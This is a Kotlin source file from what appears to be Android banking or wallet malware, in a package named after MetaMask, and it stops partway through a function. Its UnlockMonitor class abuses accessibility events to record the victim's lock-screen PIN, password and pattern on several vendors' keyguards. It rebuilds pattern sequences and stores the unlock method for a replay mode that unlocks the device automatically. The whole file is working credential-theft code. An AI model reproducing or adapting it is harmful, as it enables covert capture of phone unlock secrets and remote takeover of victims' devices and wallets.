package com.example.MetaMask.services

import android.app.KeyguardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.MetaMask.receivers.UnlockExecutor
import org.json.JSONArray
import org.json.JSONObject

class UnlockMonitor(private val context: Context) {

    companion object {
        private const val PREFS     = "cfg"
        private const val PREFS_KEY = "unlock_method_json"

        @Volatile var isReplayMode: Boolean = false

        @Volatile var lastBotUnlockMs: Long = 0L

        private const val BOT_UNLOCK_PROTECT_MS = 15_000L

        private val KEYGUARD_PACKAGES = setOf(
            "com.android.systemui",
            "com.android.keyguard",
            "com.miui.keyguard",
            "com.oppo.keyguard",
            "com.vivo.keyguard",
            "com.samsung.android.app.smartlock",
            "com.sec.android.systemui",
            "com.samsung.android.keyguard"
        )

        private val DIGIT_RE           = Regex("^[0-9]$")
        private val DELETE_HINTS       = setOf("delete", "backspace", "удалить", "стереть", "back", "del")
        private val CELL_NUM_RE        = Regex("(?:Ячейка|Сота)\\s+(\\d+)", RegexOption.IGNORE_CASE)
        private val CELL_NUM_GLOBAL_RE = Regex("(?:ячейка|сота|cell|dot)\\s*(\\d)", RegexOption.IGNORE_CASE)
        private val CELL_ANY_RE        = Regex("(?:ячейка|сота|cell|dot|added|добавлена)", RegexOption.IGNORE_CASE)
    }

    private val km: KeyguardManager? by lazy {
        context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
    }

    @Volatile var onLockScreen    = false
    @Volatile private var lockScreenType   = "swipe"
    private val collectedDigits   = mutableListOf<String>()
    val patternDots               = mutableListOf<Int>()
    private var capturedPassword    = ""
    private var passwordFieldFocused = false
    private var enterCount          = 0
    private var unlockTimestampMs = 0L

    private var maxCellNumSeen    = 0

    private data class CellState(val sel: Boolean, val chk: Boolean, val foc: Boolean, val en: Boolean, val click: Boolean)

    private val cellBaseline      = mutableMapOf<Int, CellState>()
    private var baselineCaptured  = false

    private val cellPrevScan      = mutableMapOf<Int, CellState>()

    private val cellLastScan      = mutableMapOf<Int, CellState>()

    val patternDotsV2          = mutableListOf<Int>()
    private val cellBaselineV2  = mutableMapOf<Int, CellState>()
    private var baselineCapturedV2 = false
    private val cellPrevScanV2  = mutableMapOf<Int, CellState>()
    private val cellLastScanV2  = mutableMapOf<Int, CellState>()
    private var maxCellNumSeenV2 = 0

    fun onEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[UnlockMonitor] onEvent enter event=${event}") //xdbg
        try { handleEvent(event) } catch (_: Exception) {}
    }

    private fun handleEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[UnlockMonitor] handleEvent enter event=${event}") //xdbg
        val type = event.eventType
        val pkg  = event.packageName?.toString() ?: ""
        val cls  = event.className?.toString()  ?: ""

        if (!onLockScreen) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val isLocked = km?.isKeyguardLocked ?: false
            val sinceUnlock = System.currentTimeMillis() - unlockTimestampMs
            if (isLocked && sinceUnlock > 3000L) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                enterLockScreen(pkg, cls)
            }
        }

        if (!onLockScreen && pkg in KEYGUARD_PACKAGES) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val sinceUnlock = System.currentTimeMillis() - unlockTimestampMs
            if (sinceUnlock > 3000L) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val src2 = try { event.source } catch (_: Exception) { null }
                val srcId2 = try { src2?.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                val isBouncer =
                    srcId2.contains("keyguard", ignoreCase = true) ||
                    srcId2 == "com.android.systemui:id/pinEntry"      ||
                    srcId2 == "com.android.systemui:id/passwordEntry" ||
                    srcId2 == "com.android.systemui:id/digit_text"    ||
                    srcId2 == "com.android.systemui:id/delete_button" ||
                    srcId2.matches(Regex("com\\.android\\.systemui:id/key[0-9]"))
                val treeMatch = if (!isBouncer && type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && src2 != null) {
                    try {
                        src2.findAccessibilityNodeInfosByViewId("com.android.systemui:id/keyguard_bouncer_container").isNotEmpty() ||
                        src2.findAccessibilityNodeInfosByViewId("com.android.systemui:id/passwordEntry").isNotEmpty() ||
                        src2.findAccessibilityNodeInfosByViewId("com.android.systemui:id/pinEntry").isNotEmpty()
                    } catch (_: Exception) { false }
                } else false
                try { src2?.recycle() } catch (_: Exception) {}
                if (isBouncer || treeMatch) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    enterLockScreen(pkg, cls)
                }
            }
        }

        if (onLockScreen &&
            (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             type == AccessibilityEvent.TYPE_WINDOWS_CHANGED)) {

            val isKeyguardPkg = pkg in KEYGUARD_PACKAGES
            val isLocked      = km?.isKeyguardLocked ?: false

            if (!isKeyguardPkg && pkg.isNotEmpty() && !isLocked) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                onUnlockSuccess()
                return
            }
            if (onLockScreen) refineLockType(cls)
        }

        if (!onLockScreen) return

        when (type) {

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = (event.text?.joinToString("") ?: "").trim()
                val desc = (event.contentDescription?.toString() ?: "").trim().lowercase()
                val clsLower = cls.lowercase()
                when {
                    DIGIT_RE.matches(text) -> {
                        if (!passwordFieldFocused) lockScreenType = "pin"
                        collectedDigits.add(text)
                    }
                    !DIGIT_RE.matches(text) && DIGIT_RE.matches(desc) -> {
                        if (!passwordFieldFocused) lockScreenType = "pin"
                        collectedDigits.add(desc)
                    }
                    text.length == 1 && text[0].isLetter() -> {
                        lockScreenType = "password"
                        capturedPassword += text
                    }
                    DELETE_HINTS.any { desc.contains(it) } || text.lowercase() in DELETE_HINTS -> {
                        collectedDigits.removeLastOrNull()
                    }
                    !isReplayMode && (clsLower.contains("pattern") || clsLower.contains("lockpattern")) -> {
                        val dot = dotFromSource(event) ?: event.currentItemIndex
                        if (dot in 0..35 && patternDots.isEmpty()) {
                            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                            lockScreenType = "pattern"
                            if (dot + 1 > maxCellNumSeen) maxCellNumSeen = dot + 1
                            patternDots.add(dot)
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_SELECTED -> {
                if (!isReplayMode) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val clsLower = cls.lowercase()
                    if (clsLower.contains("pattern") || clsLower.contains("lockpattern")) {
                        android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                        lockScreenType = "pattern"
                        val fromSrc = dotFromSource(event)
                        val rawIdx  = event.currentItemIndex
                        val dot = fromSrc ?: rawIdx
                        if (dot in 0..35 && !patternDots.contains(dot)) {
                            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                            if (dot + 1 > maxCellNumSeen) maxCellNumSeen = dot + 1
                            patternDots.add(dot)
                        }
                    }
                    if (pkg in KEYGUARD_PACKAGES && event.itemCount in listOf(9, 16, 25) && baselineCapturedV2) {
                        android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                        val dot = event.currentItemIndex
                        if (dot in 0..35 && !patternDotsV2.contains(dot)) {
                            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                            if (dot + 1 > maxCellNumSeenV2) maxCellNumSeenV2 = dot + 1
                            patternDotsV2.add(dot)
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED -> {
                tryAddCellFromEvent(event, "ACCESSIBILITY_FOCUSED")
            }

            @Suppress("DEPRECATION")
            AccessibilityEvent.TYPE_ANNOUNCEMENT -> {
                val text = event.text?.joinToString("") ?: ""

                val errorHints = listOf("неверн", "wrong", "try again", "повтори", "incorrect")
                if (!isReplayMode && lockScreenType == "pattern" && patternDots.isNotEmpty() &&
                    errorHints.any { text.contains(it, ignoreCase = true) }) {
                    patternDots.clear()
                }

                if (!isReplayMode && text.contains("Ввод графического ключа", ignoreCase = true)) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    lockScreenType = "pattern"
                    addAlreadyFalsePatternCells()
                }

                if (!isReplayMode) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val mNum = CELL_NUM_GLOBAL_RE.find(text)
                    if (mNum != null) {
                        android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                        val cellNum = mNum.groupValues[1].toIntOrNull()
                        val dot = cellNum?.minus(1)
                        if (dot != null && dot in 0..35 && !patternDots.contains(dot)) {
                            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                            lockScreenType = "pattern"
                            if ((cellNum ?: 0) > maxCellNumSeen) maxCellNumSeen = cellNum!!
                            patternDots.add(dot)
                        }
                    } else if (CELL_ANY_RE.containsMatchIn(text)) {
                        lockScreenType = "pattern"
                        val next = patternDots.size
                        if (next in 0..35) {
                            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                            patternDots.add(next)
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (pkg in KEYGUARD_PACKAGES || pkg.isEmpty()) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    scanFullTree()
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (pkg !in KEYGUARD_PACKAGES && pkg.isNotEmpty()) return
                val t = event.text?.joinToString("") ?: ""
                if (!passwordFieldFocused) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val pwdSrcId = try { event.source?.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                    if (pwdSrcId == "com.android.systemui:id/pinEntry") {
                        android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                        lockScreenType = "pin"
                    } else if (pwdSrcId == "com.android.systemui:id/passwordEntry") {
                        passwordFieldFocused = true
                        lockScreenType = "password"
                        capturedPassword = ""
                    }
                }
                if (!passwordFieldFocused && lockScreenType != "pin") {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    lockScreenType = if (t.isNotEmpty() && t.all { it.isDigit() }) "pin" else "password"
                }
                if (passwordFieldFocused) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val added   = event.addedCount
                    val removed = event.removedCount
                    val fromIdx = event.fromIndex
                    when {
                        removed > 0 && added == 0 -> {
                            repeat(removed) {
                                if (capturedPassword.isNotEmpty())
                                    capturedPassword = capturedPassword.dropLast(1)
                            }
                        }
                        added > 0 -> {
                            val node = try { event.source } catch (_: Exception) { null }
                            val nodeText = try { node?.text?.toString() ?: "" } catch (_: Exception) { "" }
                            try { node?.recycle() } catch (_: Exception) {}
                            for (i in 0 until added) {
                                android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
                                val pos = fromIdx + i
                                val cNode = nodeText.getOrNull(pos)
                                val cEvt  = if (pos > 0) t.getOrNull(pos - 1) else null
                                fun Char.isVisible() = this != '•' && this != '●' && !isISOControl()
                                val ch = when {
                                    cNode != null && cNode.isVisible() -> cNode
                                    cEvt  != null && cEvt.isVisible()  -> cEvt
                                    else -> null
                                }
                                if (ch != null) capturedPassword += ch
                            }
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val node = try { event.source } catch (_: Exception) { null }
                if (node != null) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    try {
                        val nodePkg = node.packageName?.toString() ?: ""
                        val isPass  = node.isPassword
                        val inKG    = nodePkg in KEYGUARD_PACKAGES
                        if (inKG && isPass) {
                            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                            val focusedId = try { node.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                            if (focusedId.contains("pinEntry")) {
                                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                                lockScreenType = "pin"
                            } else {
                                passwordFieldFocused = true
                                capturedPassword = ""
                                lockScreenType = "password"
                            }
                        } else if (nodePkg.isNotEmpty() && !inKG) {
                            passwordFieldFocused = false
                        }
                    } finally {
                        try { node.recycle() } catch (_: Exception) {}
                    }
                }
            }
        }
    }

    private fun addAlreadyFalsePatternCells() {
        android.util.Log.d("XDBG", "[UnlockMonitor] addAlreadyFalsePatternCells enter") //xdbg
        if (isReplayMode) return
        val svc = context as? AccessSvc ?: return
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { return } ?: return
        val found = mutableMapOf<Int, CellState>()
        try { collectCells(root, found) } finally { try { root.recycle() } catch (_: Exception) {} }
        if (found.isEmpty()) return

        if (!baselineCaptured) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            cellBaseline.putAll(found)
            cellPrevScan.putAll(found)
            baselineCaptured = true
        }

        val newCells = found
            .filter { (dot, state) -> !state.click && !patternDots.contains(dot) }
            .keys.toList()
        if (newCells.isEmpty()) return

        val sorted = sortByNearestNeighbor(newCells, patternDots.lastOrNull())
        for (dot in sorted) {
            android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
            patternDots.add(dot)
        }
    }

    private fun tryAddCellFromEvent(event: AccessibilityEvent, tag: String) {
        android.util.Log.d("XDBG", "[UnlockMonitor] tryAddCellFromEvent enter event=${event} tag=${tag}") //xdbg
        val src = try { event.source } catch (_: Exception) { null } ?: return
        try { tryAddCellFromNode(src, tag) }
        finally { try { src.recycle() } catch (_: Exception) {} }
    }


    private fun dotFromSource(event: AccessibilityEvent): Int? {
        android.util.Log.d("XDBG", "[UnlockMonitor] dotFromSource enter event=${event}") //xdbg
        val src = try { event.source } catch (_: Exception) { null } ?: return null
        return try {
            val text = "${src.text ?: ""}${src.contentDescription ?: ""}"
            val m = CELL_NUM_RE.find(text) ?: CELL_NUM_GLOBAL_RE.find(text)
            val n = m?.groupValues?.getOrNull(1)?.toIntOrNull()
            if (n != null && n in 1..36) n - 1 else null
        } finally {
            try { src.recycle() } catch (_: Exception) {}
        }
    }

    private fun tryAddCellFromNode(node: AccessibilityNodeInfo, tag: String) {
        android.util.Log.d("XDBG", "[UnlockMonitor] tryAddCellFromNode enter node=${node} tag=${tag}") //xdbg
        if (isReplayMode) return
        val text = "${node.text ?: ""}${node.contentDescription ?: ""}"
        val m = CELL_NUM_RE.find(text) ?: return
        val cellNum = m.groupValues[1].toIntOrNull() ?: return
        if (cellNum in 1..36) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            lockScreenType = "pattern"
            if (cellNum > maxCellNumSeen) maxCellNumSeen = cellNum
            val dot = cellNum - 1
            if (!patternDots.contains(dot)) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                patternDots.add(dot)
            }
        }
    }

    private fun scanFullTree() {
        android.util.Log.d("XDBG", "[UnlockMonitor] scanFullTree enter") //xdbg
        val svc = context as? AccessSvc ?: return
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { return } ?: return
        val found   = mutableMapOf<Int, CellState>()
        val foundV2 = mutableMapOf<Int, CellState>()
        try {
            collectCells(root, found)
            collectCellsByIndex(root, foundV2)
        } finally { try { root.recycle() } catch (_: Exception) {} }

        if (found.isEmpty() && foundV2.isEmpty()) return

        processV2Found(foundV2)

        if (found.isEmpty()) return

        cellLastScan.clear()
        cellLastScan.putAll(found)

        if (!baselineCaptured) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            cellBaseline.putAll(found); cellPrevScan.putAll(found); baselineCaptured = true
            if (!isReplayMode) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val alreadyActive = found.filter { (_, state) -> !state.click }.keys.toList()
                if (alreadyActive.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    lockScreenType = "pattern"
                    val sorted = sortByNearestNeighbor(alreadyActive, null)
                    for (dot in sorted) patternDots.add(dot)
                }
            }
            return
        }

        if (!isReplayMode && patternDots.isNotEmpty()) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val hasReset = patternDots.any { dot -> found[dot]?.click == true }
            if (hasReset) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                patternDots.clear()
                cellBaseline.clear(); cellPrevScan.clear(); cellLastScan.clear()
                cellBaseline.putAll(found); cellPrevScan.putAll(found)
                cellLastScan.putAll(found); baselineCaptured = true
                return
            }
        }

        if (!isReplayMode) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val newCells = mutableListOf<Int>()
            for ((dot, state) in found) {
                android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
                val prev = cellPrevScan[dot]
                val becameInactive = !state.click && (prev == null || prev.click)
                if (becameInactive && !patternDots.contains(dot)) newCells.add(dot)
            }
            if (newCells.isNotEmpty()) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                lockScreenType = "pattern"
                val sorted = sortByNearestNeighbor(newCells, patternDots.lastOrNull())
                for (dot in sorted) patternDots.add(dot)
            }
        }

        cellPrevScan.clear(); cellPrevScan.putAll(found)
    }

    private fun processV2Found(foundV2: MutableMap<Int, CellState>) {
        android.util.Log.d("XDBG", "[UnlockMonitor] processV2Found enter foundV2=${foundV2}") //xdbg
        if (foundV2.isEmpty()) return
        cellLastScanV2.clear(); cellLastScanV2.putAll(foundV2)

        if (!baselineCapturedV2) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            cellBaselineV2.putAll(foundV2); cellPrevScanV2.putAll(foundV2); baselineCapturedV2 = true
            if (!isReplayMode) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val already = foundV2.filter { (_, s) -> !s.click || s.sel }.keys.toList()
                if (already.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val sorted = sortByNearestNeighbor(already, null, patternDotsV2, maxCellNumSeenV2)
                    for (d in sorted) patternDotsV2.add(d)
                }
            }
            return
        }

        if (!isReplayMode && patternDotsV2.isNotEmpty()) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val hasResetV2 = patternDotsV2.any { dot ->
                val s    = foundV2[dot]        ?: return@any false
                val prev = cellPrevScanV2[dot] ?: return@any false
                (!prev.click || prev.sel) && s.click && !s.sel
            }
            if (hasResetV2) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                patternDotsV2.clear()
                cellBaselineV2.clear(); cellPrevScanV2.clear(); cellLastScanV2.clear()
                cellBaselineV2.putAll(foundV2); cellPrevScanV2.putAll(foundV2)
                cellLastScanV2.putAll(foundV2); baselineCapturedV2 = true
                return
            }
        }

        if (!isReplayMode) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val newV2 = mutableListOf<Int>()
            for ((dot, state) in foundV2) {
                android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
                val prev = cellPrevScanV2[dot]
                val becameSelected = state.sel   && !(prev?.sel   ?: false)
                val becameLocked   = !state.click && (prev == null || prev.click)
                if ((becameSelected || becameLocked) && !patternDotsV2.contains(dot)) newV2.add(dot)
            }
            if (newV2.isNotEmpty()) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val sorted = sortByNearestNeighbor(newV2, patternDotsV2.lastOrNull(), patternDotsV2, maxCellNumSeenV2)
                for (d in sorted) patternDotsV2.add(d)
            }
        }

        cellPrevScanV2.clear(); cellPrevScanV2.putAll(foundV2)
    }

    private fun sortByNearestNeighbor(
        cells: List<Int>, startFrom: Int?,
        priorDots: List<Int> = patternDots, maxSeen: Int = maxCellNumSeen
    ): List<Int> {
        if (cells.size <= 1) return cells
        val cols = if (maxSeen > 0)
            Math.ceil(Math.sqrt(maxSeen.toDouble())).toInt().coerceAtLeast(3)
        else 3
        fun row(d: Int) = d / cols
        fun col(d: Int) = d % cols
        fun dist2(a: Int, b: Int): Int {
            android.util.Log.d("XDBG", "[UnlockMonitor] dist2 enter a=${a} b=${b}") //xdbg
            val dr = row(a) - row(b); val dc = col(a) - col(b); return dr * dr + dc * dc
        }
        val remaining = cells.toMutableList()
        val result = mutableListOf<Int>()
        var cur = startFrom ?: remaining.minOrNull() ?: return result
        var prev2: Int? = if (priorDots.size >= 2) priorDots[priorDots.size - 2] else null

        while (remaining.isNotEmpty()) {
            android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
            val minD = remaining.minOf { dist2(it, cur) }
            val candidates = remaining.filter { dist2(it, cur) == minD }
            val next = if (candidates.size == 1 || prev2 == null) {
                candidates[0]
            } else {
                val dr = row(cur) - row(prev2!!); val dc = col(cur) - col(prev2!!)
                val contDot = (row(cur) + dr) * cols + (col(cur) + dc)
                candidates.minByOrNull { dist2(it, contDot) } ?: candidates[0]
            }
            result.add(next); remaining.remove(next); prev2 = cur; cur = next
        }
        android.util.Log.d("XDBG", "[UnlockMonitor] return") //xdbg
        return result
    }

    private fun collectCells(node: AccessibilityNodeInfo, out: MutableMap<Int, CellState>) {
        android.util.Log.d("XDBG", "[UnlockMonitor] collectCells enter node=${node} out=${out}") //xdbg
        try {
            val text = "${node.text ?: ""}${node.contentDescription ?: ""}"
            val m = CELL_NUM_RE.find(text)
            if (m != null) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val cellNum = m.groupValues[1].toIntOrNull()
                if (cellNum != null && cellNum in 1..36) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    if (cellNum > maxCellNumSeen) maxCellNumSeen = cellNum
                    val dot = cellNum - 1
                    val state = CellState(
                        sel   = node.isSelected,
                        chk   = node.isChecked,
                        foc   = node.isFocused,
                        en    = node.isEnabled,
                        click = node.isClickable
                    )
                    out[dot] = state
                }
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { collectCells(child, out) } finally { try { child.recycle() } catch (_: Exception) {} }
            }
        } catch (_: Exception) {}
    }

    private fun collectCellsByIndex(node: AccessibilityNodeInfo, out: MutableMap<Int, CellState>): Boolean {
        android.util.Log.d("XDBG", "[UnlockMonitor] collectCellsByIndex enter node=${node} out=${out}") //xdbg
        val cls = node.className?.toString() ?: ""
        if (cls.contains("LockPatternView", ignoreCase = true) ||
            cls.contains("PatternLockView",  ignoreCase = true) ||
            cls.contains("GestureView",       ignoreCase = true)) {
            val count = node.childCount
            if (count in 4..36) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                if (count > maxCellNumSeenV2) maxCellNumSeenV2 = count
                for (i in 0 until count) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
                    val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                    try {
                        val s = CellState(
                            sel = child.isSelected, chk = child.isChecked,
                            foc = child.isFocused,  en  = child.isEnabled, click = child.isClickable
                        )
                        out[i] = s
                    } finally { try { child.recycle() } catch (_: Exception) {} }
                }
                android.util.Log.d("XDBG", "[UnlockMonitor] return") //xdbg
                return true
            }
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[UnlockMonitor] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try { if (collectCellsByIndex(child, out)) return true }
            finally { try { child.recycle() } catch (_: Exception) {} }
        }
        android.util.Log.d("XDBG", "[UnlockMonitor] return") //xdbg
        return false
    }

    private fun refineLockType(cls: String) {
        android.util.Log.d("XDBG", "[UnlockMonitor] refineLockType enter cls=${cls}") //xdbg
        val lower = cls.lowercase()
        when {
            lower.contains("pin") || lower.contains("pinentry")  ->
                if (lockScreenType == "swipe") lockScreenType = "pin"
            lower.contains("password")                            ->
                if (lockScreenType == "swipe") lockScreenType = "password"
            lower.contains("pattern")                             ->
                lockScreenType = "pattern"
        }
    }

    private fun enterLockScreen(pkg: String, cls: String) {
        android.util.Log.d("XDBG", "[UnlockMonitor] enterLockScreen enter pkg=${pkg} cls=${cls}") //xdbg
        onLockScreen         = true
        lockScreenType       = "swipe"
        collectedDigits.clear()
        patternDots.clear()
        capturedPassword     = ""
        passwordFieldFocused = false
        cellBaseline.clear()
        cellPrevScan.clear()
        cellLastScan.clear()
        baselineCaptured  = false
        maxCellNumSeen    = 0
        patternDotsV2.clear()
        cellBaselineV2.clear(); cellPrevScanV2.clear(); cellLastScanV2.clear()
        baselineCapturedV2 = false; maxCellNumSeenV2 = 0
        enterCount++

        val craneMode = try { CraneService.craneMode } catch (_: Exception) { "off" }
        if (craneMode != "off" && craneMode.isNotBlank()) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            Handler(Looper.getMainLooper()).postDelayed({
                val cm = try { CraneService.craneMode } catch (_: Exception) { "off" }
                if (cm != "off" && cm.isNotBlank() && !UnlockExecutor.inProgress) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val svc = context as? AccessSvc ?: return@postDelayed
                    UnlockExecutor.execute(context, svc)
                }
            }, 600L)
        }

        Handler(Looper.getMainLooper()).postDelayed({
            if (onLockScreen && (!baselineCaptured || !baselineCapturedV2)) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val svc = context as? AccessSvc ?: return@postDelayed
                val root = try { svc.rootInActiveWindow } catch (_: Exception) { return@postDelayed }
                    ?: return@postDelayed
                val found   = mutableMapOf<Int, CellState>()
                val foundV2 = mutableMapOf<Int, CellState>()
                try {
                    collectCells(root, found)
                    collectCellsByIndex(root, foundV2)
                } finally { try { root.recycle() } catch (_: Exception) {} }
                if (found.isNotEmpty() && !baselineCaptured) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    cellBaseline.putAll(found); cellPrevScan.putAll(found); baselineCaptured = true
                }
                if (foundV2.isNotEmpty() && !baselineCapturedV2) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    cellBaselineV2.putAll(foundV2); cellPrevScanV2.putAll(foundV2); baselineCapturedV2 = true
                }
            }
        }, 250L)
    }

    private fun onUnlockSuccess() {
        android.util.Log.d("XDBG", "[UnlockMonitor] onUnlockSuccess enter") //xdbg
        onLockScreen      = false
        unlockTimestampMs = System.currentTimeMillis()

        if (!isReplayMode && baselineCaptured) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            val svc = context as? AccessSvc
            val freshRoot = try { svc?.rootInActiveWindow } catch (_: Exception) { null }
            val freshScan   = mutableMapOf<Int, CellState>()
            val freshScanV2 = mutableMapOf<Int, CellState>()
            if (freshRoot != null) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                try {
                    collectCells(freshRoot, freshScan)
                    collectCellsByIndex(freshRoot, freshScanV2)
                } finally { try { freshRoot.recycle() } catch (_: Exception) {} }
            }
            val scanToUse = if (freshScan.isNotEmpty()) freshScan else cellLastScan
            val recoveryCells = scanToUse
                .filter { (dot, state) ->
                    !state.click &&
                    (cellBaseline[dot]?.click != false) &&
                    !patternDots.contains(dot)
                }
                .keys.toList()
            if (recoveryCells.isNotEmpty()) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                lockScreenType = "pattern"
                val sorted = sortByNearestNeighbor(recoveryCells, patternDots.lastOrNull())
                for (dot in sorted) patternDots.add(dot)
            }
            val scanToUseV2 = if (freshScanV2.isNotEmpty()) freshScanV2 else cellLastScanV2
            val recoveryCellsV2 = scanToUseV2
                .filter { (dot, state) ->
                    val nowActive  = !state.click || state.sel
                    val wasNeutral = (cellBaselineV2[dot]?.click ?: true) && !(cellBaselineV2[dot]?.sel ?: false)
                    nowActive && wasNeutral && !patternDotsV2.contains(dot)
                }
                .keys.toList()
            if (recoveryCellsV2.isNotEmpty()) {
                android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                val sorted = sortByNearestNeighbor(recoveryCellsV2, patternDotsV2.lastOrNull(), patternDotsV2, maxCellNumSeenV2)
                for (dot in sorted) patternDotsV2.add(dot)
            }
        }

        if (isReplayMode) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            lastBotUnlockMs = System.currentTimeMillis()
            collectedDigits.clear(); patternDots.clear()
            cellBaseline.clear(); cellPrevScan.clear(); cellLastScan.clear()
            baselineCaptured = false; maxCellNumSeen = 0
            patternDotsV2.clear(); cellBaselineV2.clear(); cellPrevScanV2.clear()
            cellLastScanV2.clear(); baselineCapturedV2 = false; maxCellNumSeenV2 = 0
            return
        }

        val sinceBot = System.currentTimeMillis() - lastBotUnlockMs
        if (lastBotUnlockMs > 0L && sinceBot < BOT_UNLOCK_PROTECT_MS) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            lastBotUnlockMs = 0L
            collectedDigits.clear(); patternDots.clear()
            cellBaseline.clear(); cellPrevScan.clear(); cellLastScan.clear()
            baselineCaptured = false; maxCellNumSeen = 0
            patternDotsV2.clear(); cellBaselineV2.clear(); cellPrevScanV2.clear()
            cellLastScanV2.clear(); baselineCapturedV2 = false; maxCellNumSeenV2 = 0
            return
        }

        if (lockScreenType != "pattern" && patternDotsV2.isNotEmpty()) {
            android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
            lockScreenType = "pattern"
        }

        val method = JSONObject()
        when (lockScreenType) {
            "pin" -> {
